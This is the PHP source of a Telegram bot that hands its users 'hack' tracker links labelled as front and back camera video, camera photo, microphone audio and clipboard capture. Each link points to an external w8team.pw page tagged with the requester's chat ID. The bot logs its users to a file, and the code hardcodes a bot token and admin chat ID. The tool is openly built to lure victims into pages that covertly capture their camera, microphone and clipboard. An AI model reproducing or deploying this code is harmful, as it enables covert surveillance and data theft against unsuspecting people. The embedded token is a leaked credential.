<?php

$botToken = '9087217791:AAEjOhKH0uOml0VcW8Vsw2whkm0ZX6cOSvY';
$mainAdminChatId = '6264050385';

function getTrackerConfig() {
    $file = __DIR__ . '/config.json';
    $defaults = [
        'trackers' => [
            ['label' => 'Font Camera Hack Video', 'url' => 'https://w8team.pw/Bots/W8TrackerProBot/FontCM.html', 'append_id' => true],
            ['label' => 'Back Camera Hack Video', 'url' => 'https://w8team.pw/Bots/W8TrackerProBot/BackCM.html', 'append_id' => true],
            ['label' => 'Camera Hack Photo', 'url' => 'https://w8team.pw/Bots/W8TrackerProBot/CameraPH.html', 'append_id' => true],
            ['label' => 'Microphone Hack Audio', 'url' => 'https://w8team.pw/Bots/W8TrackerProBot/Microphone.html', 'append_id' => true],
            ['label' => 'Clipboard Hack', 'url' => 'https://w8team.pw/Bots/W8TrackerProBot/Clipboard.html', 'append_id' => true],
        ],
        'channel' => ['label' => 'Join Channel Free Hacks', 'url' => 'https://t.me/W8TeamSB'],
        'banned' => [],
    ];
    if (!file_exists($file)) return $defaults;
    $data = @json_decode(file_get_contents($file), true);
    if (!is_array($data)) return $defaults;
    if (empty($data['trackers']) && isset($data['url_font'])) {
        $data['trackers'] = [
            ['label' => 'Font Camera Hack Video', 'url' => $data['url_font'], 'append_id' => true],
            ['label' => 'Back Camera Hack Video', 'url' => $data['url_back'], 'append_id' => true],
            ['label' => 'Camera Hack Photo', 'url' => $data['url_camera'], 'append_id' => true],
        ];
        $data['channel'] = ['label' => 'Join Channel', 'url' => $data['url_channel'] ?? 'https://t.me/W8TeamSB'];
    }
    if (empty($data['trackers'])) $data['trackers'] = $defaults['trackers'];
    if (empty($data['channel'])) $data['channel'] = $defaults['channel'];
    if (!isset($data['banned']) || !is_array($data['banned'])) $data['banned'] = [];
    return $data;
}

function isBanned($chatId) {
    $config = getTrackerConfig();
    return in_array((string)$chatId, array_map('strval', $config['banned']), true);
}

// Sanitize button label for Telegram (max 64 bytes, no control chars)
function sanitizeButtonLabel($label) {
    $s = trim(preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/u', '', (string)$label));
    if ($s === '') return '';
    if (strlen($s) > 64) return mb_strcut($s, 0, 64, 'UTF-8');
    return $s;
}

// Normalize URL for Telegram - fix @username, https://Username, and any invalid format so any URL works
function normalizeButtonUrl($url) {
    $url = trim((string)$url);
    if ($url === '') return '';
    $url = preg_replace('/[\x00-\x1F\x7F]/u', '', $url);
    // @Username or https://@Username -> https://t.me/Username
    if (preg_match('#^(?:https?://)?@([a-zA-Z0-9_]+)$#', $url, $m)) {
        return 'https://t.me/' . $m[1];
    }
    if (preg_match('#^https?://@#i', $url)) {
        $username = preg_replace('#^https?://@#i', '', $url);
        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $username);
        if ($username !== '') return 'https://t.me/' . $username;
    }
    // https://W8SOJIB or http://Username (no dot, no path) -> https://t.me/Username
    if (preg_match('#^https?://([a-zA-Z0-9_]+)$#i', $url, $m) && strpos($m[1], '.') === false) {
        return 'https://t.me/' . $m[1];
    }
    if (preg_match('#^t\.me/#i', $url)) {
        $url = 'https://' . $url;
    } elseif (!preg_match('#^https?://#i', $url)) {
        $url = 'https://' . $url;
    }
    return $url;
}

$update = file_get_contents('php://input');
$data = json_decode($update, true);
$messageData = $data['message'] ?? null;
if (!$messageData || empty($messageData['chat'])) {
    exit;
}
$chatId = $messageData['chat']['id'] ?? null;
$userFirstName = $messageData['chat']['first_name'] ?? '';
$userLastName = $messageData['chat']['last_name'] ?? '';
if ($chatId === null) {
    exit;
}

function sendMessage($chatId, $message) {
    global $botToken;
    if ($chatId === null || trim((string)$message) === '') return false;
    $apiUrl = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = ['chat_id' => $chatId, 'text' => $message];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    return file_get_contents($apiUrl, false, $context);
}

function sendMessageWithInlineKeyboard($chatId, $message, $keyboard) {
    global $botToken;
    if ($chatId === null || trim((string)$message) === '') return false;
    $apiUrl = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'reply_markup' => json_encode($keyboard),
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    return file_get_contents($apiUrl, false, $context);
}

function getAllUsers() {
    $file = __DIR__ . '/user.txt';
    if (!file_exists($file)) return "No users found.";
    return file_get_contents($file);
}

function saveUserData($chatId, $userFirstName, $userLastName) {
    $file = __DIR__ . '/user.txt';
    $existingData = file_exists($file) ? file_get_contents($file) : '';
    $userData = "Chat ID: " . $chatId . ", Name: " . $userFirstName . " " . $userLastName;
    if (strpos($existingData, $userData) === false) {
        file_put_contents($file, $userData . PHP_EOL, FILE_APPEND);
    }
}

if (strpos($update, '/start') !== false) {
    if (isBanned($chatId)) {
        sendMessage($chatId, 'You are banned from using this bot.');
        exit;
    }
    $config = getTrackerConfig();
    $rows = [];
    foreach ($config['trackers'] as $t) {
        $label = sanitizeButtonLabel($t['label'] ?? '');
        $url = normalizeButtonUrl($t['url'] ?? '');
        if ($label === '' || $url === '') continue;
        if (!empty($t['append_id'])) {
            $url = rtrim($url, '?&') . (strpos($url, '?') !== false ? '&' : '?') . 'id=' . $chatId;
        }
        $rows[] = [['text' => $label, 'url' => $url]];
    }
    $chLabel = sanitizeButtonLabel($config['channel']['label'] ?? '');
    $chUrl = normalizeButtonUrl($config['channel']['url'] ?? '');
    if ($chLabel !== '' && $chUrl !== '') {
        $rows[] = [['text' => $chLabel, 'url' => $chUrl]];
    }
    $welcome = 'Welcome to the bot! Click one of the buttons below to open a tracker or join our channel.';
    if (!empty($rows)) {
        sendMessageWithInlineKeyboard($chatId, $welcome, ['inline_keyboard' => $rows]);
    } else {
        sendMessage($chatId, $welcome . ' (No buttons configured. Admin: add tracker buttons in the admin panel.)');
    }
    saveUserData($chatId, $userFirstName, $userLastName);
}

if (strpos($update, '/user') !== false) {
    if ($chatId == $mainAdminChatId) {
        $allUsers = getAllUsers();
        $userCount = substr_count($allUsers, 'Chat ID:');
        sendMessage($chatId, 'Total Users: ' . $userCount . "\n\n" . $allUsers);
    } else {
        sendMessage($chatId, 'Unauthorized access. Only the main admin can view user details.');
    }
}

?>
